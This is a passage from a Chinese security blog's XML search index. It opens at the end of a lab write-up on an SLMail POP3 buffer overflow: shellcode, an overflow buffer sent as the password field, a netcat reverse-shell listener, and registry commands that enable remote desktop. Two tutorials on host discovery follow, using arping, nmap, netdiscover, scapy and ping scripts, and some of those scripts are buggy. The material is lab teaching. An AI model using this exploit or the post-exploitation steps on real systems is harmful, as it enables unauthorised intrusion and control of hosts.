&quot;\xa7\xb1\xeb\xdc\xa7\x81\xff\x2f\x44\x4f\xb9\x7f\xc0\x91\x08\xa7&quot; + &quot;\x4a\x92\x91\x19\x1f\xf3\x9f\x06\x5f\xf3\xa8\x25\xd3\x11\x9f\xba&quot; + &quot;\xc1\x3d\xcc\x21\xd3\x17\xa8\xf8\xc9\xa7\x76\x9c\x24\xc3\xa2\x1b&quot; + &quot;\x2e\x3e\x27\x19\xf5\xc8\x02\xdc\x7b\x3e\x21\x22\x7f\x92\xa4\x32&quot; + &quot;\x7f\x82\xa4\x8e\xfc\xa9\x37\xd9\x43\x4d\x91\x19\x3d\x9d\x91\x22&quot; + &quot;\xa5\x20\x62\x19\xc0\x38\x5d\x11\x7b\x3e\x21\x1b\x3c\x90\xa2\x8e&quot; + &quot;\xfc\xa7\x9d\x15\x4a\xa9\x94\x1c\x46\x91\xae\x58\xe0\x48\x10\x1b&quot; + &quot;\x68\x48\x15\x40\xec\x32\x5d\xe4\xa5\x3c\x09\x33\x01\x3f\xb5\x5d&quot; + &quot;\xa1\xbb\xcf\xda\x87\x6a\x9f\x03\xd2\x72\xe1\x8e\x59\xe9\x08\xa7&quot; + &quot;\x77\x96\xa5\x20\x7d\x90\x9d\x70\x7d\x90\xa2\x20\xd3\x11\x9f\xdc&quot; + &quot;\xf5\xc4\x39\x22\xd3\x17\x9d\x8e\xd3\xf6\x08\xa1\x44\x26\x8e\xb7&quot; + &quot;\x55\x3e\x82\x75\xd3\x17\x08\x06\xd0\x3e\x27\x19\xdc\x4b\xf3\x2e&quot; + &quot;\x7f\x3e\x21\x8e\xfc\xc1&quot;) buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;\x90&apos; * 8 +shellcode try: #\x90表示的是汇编中的nop，就是不执行操作，保证shellcode的可用性，为了防止esp执行的时候把我的shellcode的前面几个字符忽略掉 print &quot;\nSending evil buffer...&quot; s.connect((&apos;192.168.111.137&apos;,110)) data = s.recv(1024) s.send(&apos;USER test&apos; + &apos;\r\n&apos;) data = s.recv(1024) s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;) print &quot;\nDone!&quot; except: print &quot;Could not connect to POP3!&quot; 现在我们监听本地的4444端口，等待反向连接 nc -vlp 4444```1234567891011121314151617181920212223- 然后保证SLmail服务正常运行，发送数据，然后缓冲区溢出利用成功，拿到系统权限： ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/34848509.jpg) - 执行系统命令： ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21092299.jpg) - 觉得命令行不舒服：改注册表，然后3389远程连接： - ```tex echo Windows Registry Editor Version 5.00&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg C:\&gt;echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg regedit /s 3389.reg rdesktop 192.168.111.137 远程桌面连接。]]></content>
      <categories>
        <category>fuzzy</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>fuzzy</tag>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[主动信息收集]]></title>
    <url>%2F2018%2F06%2F05%2F%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[被动收集的信息可能不是最新的信息，通过主动的手段去发现更精确的信息 直接与目标系统交互通信 无法避免留下访问的痕迹（如果目标系统有完善的系统日志） 使用受控的第三方电脑进行探测 使用代理或已经被控制的主机 做好本封杀的准备 使用噪声迷惑目标，淹没真实的探测流量 扫描 发送不同的探测，根据返回结果判断目标状态（ip，端口，服务） 发现 识别活着的主机 潜在的被攻击目标 输出一个ip地址列表 2，3，4层发现 发现——二层发现 优点：扫描速度快，可靠 缺点：不可路由，只能发现本网段 ARP协议 抓包 arping:(二层中单个存活主机的探测) arping 192.168.0.1 -c 1``` -c是指定发送一个包以后看是否存在，否则会一直发包；如果不在一个网络里，发包的话是不存在的12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182 - ```sudo arping 192.168.0.1 -d``` -d是同一个ip拥有不同的Mac地址，就是说，如果结果显示有两个Mac地址声称自己是网关，那么你的网络就存在arp欺骗，然后根据路由器查arp表进行定位 - ```sudo arping 192.168.0.1 -c 1 | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 |cut -d &quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1``` 通过管道显示活着的主机 - 但是这样只能扫描一个ip，不能自动化的去扫描一个网段，所以用脚本去实现：扫描的时候可以指定网卡，这里用bash脚本来实现这个功能```sudo ./arping1.sh eth0 &gt; addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/12275742.jpg) - 第二个脚本：这个脚本的功能是去探测已知ip列表的主机是否存活的脚本，前提是要有一个ip列表的文件```sudo ./arping2.sh addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/77751631.jpg) - 如果要在扫描的时候直接将结果重定向到一个文本文件中，直接早bash脚本中添加即可2. 二层发现——nmap: - ```nmap -sn 192.168.0.1/24``` 扫描速度更快，显示的信息更多 - &gt; Nmap scan report for 192.168.0.1 &gt; Host is up (0.020s latency). &gt; Nmap scan report for 192.168.0.101 &gt; Host is up (0.0011s latency). &gt; Nmap scan report for 192.168.0.104 &gt; Host is up (0.084s latency). &gt; Nmap scan report for 192.168.0.107 &gt; Host is up (0.00059s latency). &gt; Nmap done: 256 IP addresses (4 hosts up) scanned in 5.65 seconds - ```nmap -iL filename -sn``` 这个可以做和arping第二个脚本一样的工作 &gt; -sn 参数不做端口扫描，但它不仅仅发ARP记录，还会DNS做ptr反向域名解析的解析3. 二层发现———Netdiscover - 专用与二层发现 - 可用于无线和交换网络环境 - 主动和被动扫描 - 主动 - netdiscover -i eth0 -r 192.168.0.1/24![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/71668956.jpg) - netdiscover -l iplist.txt - 被动 - netdiscover -p （开启混杂模式）只要在在网卡上有arp包数据，就可以侦听到：![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/18073354.jpg) - 主动arp容易触发预警4. 二层发现———Scapy - scapy - 作为Python的库文件进行调用 - 也可以做单独的工具使用 - 抓包，分析，创建，修改，注入网络流量 - apt-get install python-gnuplot - 输入scapy启动scapy启动，然后输入ARP()调用这个函数，```ARP().display()查询ARP函数的属性``` ，这样就可以定制（arp的报头结构，将函数的属性字段添加进去，这样就可以实现一个arp查询）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/83165222.jpg) - 直接利用scapy进行arp探测，实际上就是通过调用scapy自带的函数进行查询： - 首先```sudo scapy``` 启动进行scapy命令行模式下 - 通过```ARP().display()``` 可以查看APR这个函数下的函数头，然后这只pdst这个要查询的目标```arp.pdst=&quot;192.168.0.1&quot;``` 这里的arp是设置的变量 - 通过```sr1(arp)``` 进行发包然后查看回显：这里也可以设置一个anwser变量带代替返回的数据包，然后调用display方法查看数据包的返回情况（有一个问题，如果查询的是一个不存在的ip，这样会一直发包，所以要加上timeout，加上一个verbose=1，显示详细的信息）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/81052649.jpg) - scapy是Python的库，所以也支持Python脚本来进行探测，可以调用这个库来写脚本进行arp扫描，前面用的是shell脚本```sudo ./arp_disc.py eth0``` 用脚本的话要慢，首先这里设计的脚本不是多线程，其次还要判断超时的时间，当然为了准确性，scarp默认发两个数据包 &gt; ```python &gt; #!/usr/bin/python &gt; &gt; import logging &gt; import subprocess &gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR) &gt; from scapy.all import * &gt; &gt; if len(sys.argv) != 2: &gt; print &quot;Usage - ./arp_disc.py [interface]&quot; &gt; print &quot;Example - ./ar_disc.py eth0&quot; &gt; print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot; &gt; sys.exit() &gt; &gt; interface = str(sys.argv[1]) &gt; &gt; ip = subprocess.check_output(&quot;ifconfig&quot; + interface + &quot; | grep &apos;inet&apos; | cut -d&apos;.&apos; -f 1-3 | cut -d&quot; &quot; -f 10 | cut -d &apos;f&apos; -f 1 &quot;,shell = True).strip() &gt; &gt; prefix = ip.split(&apos;.&apos;)[0] + &apos;.&apos; + ip.split(&apos;.&apos;)[1] + &apos;.&apos; +ip.split(&apos;.&apos;)[2] + &apos;.&apos; &gt; &gt; for addr in range(1,254): &gt; answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 1,verbose = 0) &gt; if answer == None: &gt; pass &gt; else: &gt; print prefix + str(addr) &gt; 第二个脚本，这个脚本和arping的第二个脚本类似，都是可以调用已知的ip列表文件进行二层的发现：./arp_disc.py ip_list.txt``` 脚本代码如下：1234567891011121314151617181920212223242526&gt; ```python&gt; #!/usr/bin/python&gt; #-*- coding:utf-8 -*-&gt; &gt; import logging&gt; import subprocess&gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)&gt; from scapy.all import *&gt; &gt; if len(sys.argv) != 2:&gt; print &quot;Usage - ./arp_disc.py [filename]&quot;&gt; print &quot;Example - ./arp_disc.py ip_list.txt&quot;&gt; print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;&gt; sys.exit()&gt; &gt; filename = str(sys.argv[1])&gt; file = open(filename,&apos;r&apos;) #打开文件列表&gt; &gt; for addr in file:&gt; answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 0.1,verbose = 0) #verbose=0，不显示报错的具体信息&gt; if answer == None:&gt; pass&gt; else:&gt; print addr.strip() #将报错信息打印出来&gt; 总结：二层的发现主要是在拿下一台主机以后以此机器作为跳板进而对整个内网进行发现，但是由于内网的网络环境未知，而且服务器上面不一定有nmap，所以我们要利用一切可以利用的工具：arping，nmap,netdiscover,scopy等工具，以及自己编写的脚本 针对上面的两个脚本再补充两个多线程的脚本，就当做py练手了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&gt; #!/usr/bin/python&gt; # -*- coding:utf-8 -*-&gt; import logging&gt; import subprocess&gt; import threading,time&gt;&gt; logging.getLogger("scapy.runtime").setLevel(logging.ERROR)&gt; from scapy.all import *&gt;&gt; if len(sys.argv) != 2:&gt; print "Usage - ./arp_disc.py [interface]"&gt; print "Example - ./arp_disc.py eth0"&gt; print "Example will perform an ARP scan of the local subnet to which eth0 is assigned"&gt; sys.exit()&gt;&gt; interface = str(sys.argv[1])&gt;&gt; ip = subprocess.check_output(&gt; "ifconfig " + interface + " | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 ",&gt; shell = True).strip()&gt; prefix = ip.split('.')[0] + '.' + ip.split('.')[1] + '.' + ip.split('.')[2] + '.'&gt;&gt;&gt; class MyThread(threading.Thread):&gt; def __init__(self):&gt; threading.Thread.__init__(self)&gt;&gt; def run(self):&gt; global answer,lock,n&gt; time.sleep(0.1)&gt; if lock.acquire():&gt; answer = sr1(ARP(pdst = prefix + str(n)),timeout = 1,verbose = 0)&gt; if answer == None:&gt; pass&gt; else:&gt; print prefix + str(n)&gt; n += 1&gt; lock.release()&gt;&gt;&gt; if __name__ == '__main__':&gt; n = 1&gt; ThreadList = []&gt; lock = threading.Lock()&gt; for addr in range(1,254):&gt; t = MyThread()&gt; ThreadList.append(t)&gt; for t in ThreadList:&gt; t.start()&gt; for t in ThreadList:&gt; t.join()&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&gt; #!/usr/bin/python&gt; # -*- coding:utf-8 -*-&gt; import logging&gt; import subprocess&gt; import threading,time&gt;&gt; logging.getLogger("scapy.runtime").setLevel(logging.ERROR)&gt; from scapy.all import *&gt;&gt; if len(sys.argv) != 2:&gt; print "Usage - ./arp_disc.py [interface]"&gt; print "Example - ./arp_disc.py eth0"&gt; print "Example will perform an ARP scan of the local subnet to which eth0 is assigned"&gt; sys.exit()&gt;&gt; interface = str(sys.argv[1])&gt;&gt; ip = subprocess.check_output(&gt; "ifconfig " + interface + " | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 ",&gt; shell = True).strip()&gt; prefix = ip.split('.')[0] + '.' + ip.split('.')[1] + '.' + ip.split('.')[2] + '.'&gt;&gt;&gt; class MyThread(threading.Thread):&gt; def __init__(self):&gt; threading.Thread.__init__(self)&gt;&gt; def run(self):&gt; global answer,lock&gt; time.sleep(0.1)&gt; if lock.acquire():&gt; for addr in range(1,254):&gt; answer = sr1(ARP(pdst = prefix + str(addr)),timeout = 1,verbose = 0)&gt; if answer == None:&gt; pass&gt; else:&gt; print prefix + str(addr)&gt; lock.release()&gt;&gt;&gt; if __name__ == '__main__':&gt; ThreadList = []&gt; lock = threading.Lock()&gt; for addr in range(1,200):&gt; t = MyThread()&gt; ThreadList.append(t)&gt; for t in ThreadList:&gt; t.start()&gt; for t in ThreadList:&gt; t.join()&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&gt; #!/usr/bin/python&gt; # -*- coding:utf-8 -*-&gt;&gt; import logging&gt; import subprocess&gt; import threading,time&gt;&gt; logging.getLogger("scapy.runtime").setLevel(logging.ERROR)&gt; from scapy.all import *&gt;&gt; if len(sys.argv) != 2:&gt; print "Usage - ./arp_disc.py [filename]"&gt; print "Example - ./arp_disc.py ip_list.txt"&gt; print "Example will perform an ARP scan of the local subnet to which eth0 is assigned"&gt; sys.exit()&gt;&gt; filename = str(sys.argv[1])&gt; file = open(filename,'r') # 打开文件列表&gt;&gt;&gt; class Mythread(threading.Thread):&gt; def __init__(self):&gt; threading.Thread.__init__(self)&gt;&gt; def run(self):&gt; global lock&gt; time.sleep(1)&gt; if lock.acquire():&gt; for addr in file:&gt; answer = sr1(ARP(pdst = addr.strip()),timeout = 0.1,&gt; verbose = 0) # verbose=0，不显示报错的具体信息,这里循环打开的是文件中的每一行IP地址&gt; if answer == None:&gt; pass&gt; else:&gt; print addr.strip() # 将报错信息打印出来&gt;&gt;&gt; if __name__ == '__main__':&gt; ThreadList = []&gt; lock = threading.Lock()&gt; for addr in range(1,200):&gt; t = MyThread()&gt; ThreadList.append(t)&gt; for t in ThreadList:&gt; t.start&gt; for t in ThreadList:&gt; t.join&gt;&gt;]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[主动信息收集——三层发现]]></title>
    <url>%2F2018%2F06%2F05%2F%E5%9F%BA%E4%BA%8ETCP-IP%E7%9A%84%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0.md%2F</url>
    <content type="text"><![CDATA[三层发现的优点 可路由 速度快 缺点 速度比二层慢 经常被边界防火墙过滤(还有可能出现宕机状态） IP、ICMP、TCP协议 ping 使用ping命令的时候如果可以接发包，使用的是数据包的type8，如果不可以使用的是type0 ping -192.168.0.102 -c 5 在这里linux和Windows的ping包有些不同，使用-c 可以指定发送多少个数据包 进行三层的发现除了进行icmp的探测之外还可以用路由追踪 使用路由追踪命令可能会被边界路由拦截，但是路由追踪和ping有点不同，它先会将TTL值设置为1，在经过第一跳路由以后减一，这个时候就会发送数据包12345678910111213141516171819- 使用traceroute和ping -R命令有点不同，使用traceroute返回的是较近的网卡，而使用ping -R返回的是较远的网卡- ```ping 192.168.1.103 -c 1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1``` 这样使用管道就可以将存在的ip显示出来- 由于ping命令本身不支持一个网段的并发性扫描，所以通过脚本来实现，三层的发现简单bash脚本： ```bash #/bin/bash if [ &quot;$#&quot; -ne 1 ]; then echo &quot;Usage - ./ping.sh [interface]&quot; echo &quot;Example - ./ping.sh 192.168.1.0&quot; echo &quot;Example will perform an ICMP&quot; exit fi prefix=$(echo $1 | cut -d &apos;.&apos; -f 1-3) for addr in $(seq 1 254); do ping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &gt;&gt; addr.txt done 除了使用bash调用ping命令之外，还可以使用scopy类似于二层发现时的脚本来进行主机发现，使用scopy的时候一定要设置超时，脚本如下： 12345678910111213141516171819import loggingimport subprocesslogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import * if len(sys.argv) != 2: print "Usage - ./pingr 0/24 ICMP" print "Example - ./pingr 192.168.0.103" print "Example will perform an ICMP scan of the 192.168.0.0/24 range" sys.exit()address = str(sys.argv[1])prefix = address.split('.')[0] + '.' + address.split('.')[1] + '.' + address.split('.')[2] + '.' for addr in range(1,254): answer=sr1(IP(dst=prefix+str(addr))/ICMP(),timeout=0.1,verbose=0) if answer == None: pass else: print prefix+str(addr) 使用脚本也可以调用已经存在的IP列表进行扫描，这样将脚本改为加载ip文件，然后调用扫描就可以了 除了使用ping和traceroute之外还可以使用nmap进行三层的发现： 192.168.1.103 -sn``` nmap 使用-sn的时候如果是在本网段的网络会发送arp包，如果不是在本网段会发送icmp的数据包，但由于nmap使用了大量不同的技术手段去探测目标，所以还会发送tcp的数据包。12343. fping :比ping的命令强大一点 - ```fping 192.168.1.103 -c 10 -g 192.168.1.1 192.168.1.103 -c 10``` fping 与ping命令不同的是将一个ip段进行扫描，也可以使用0/24扫描，只显示ip的话可以使用管道进行分割12345678910111213 - ```fping -f iplist.txt``` 调用ip列表文件4. hping : - 能发送几乎任意TCO/IP的数据包，在一定程度上可以进行压力测试 - 功能强大，但每次只能扫描一个目标 - ```hping3 192.168.1.103 --icmp -c 2``` 也可以进行三层扫描 - 也可以使用一行的方式实现一个ip段的扫描，因为显示的内容太多，所以将扫描结果保存到一个TXT文件中 ```for addr in $(seq 1 254);do hping3 192.168.1.$addr --icmp -c 1 &gt;&gt; hping.txt &amp; done]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>parrot</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
</search>
